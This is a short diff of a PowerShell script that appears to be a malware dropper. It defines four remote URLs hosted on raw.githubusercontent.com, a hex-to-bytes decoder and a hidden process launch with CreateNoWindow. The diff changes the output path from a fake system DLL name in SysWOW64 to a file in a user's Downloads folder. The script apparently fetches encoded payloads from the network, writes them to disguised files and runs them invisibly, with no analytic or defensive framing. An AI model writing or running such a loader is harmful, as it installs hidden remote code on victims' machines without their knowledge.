@@ -2,7 +2,7 @@ $urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe
 $urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
 $urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
 $urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.txt"
-$filePath = "C:\Windows\SysWOW64\ntdllp.dll"
+$filePath = "C:\Users\Admin\Downloads\dir4\nidll.xml"
 $clipText = "SteF6b2WrAgu"
 function HexToBytes {
     param([string]$hexStr)
@@ -42,3 +42,4 @@ $psi2.UseShellExecute = $false
 $psi2.CreateNoWindow = $true
 $process2 = [System.Diagnostics.Process]::Start($psi2)
 $process2.WaitForExit()
+
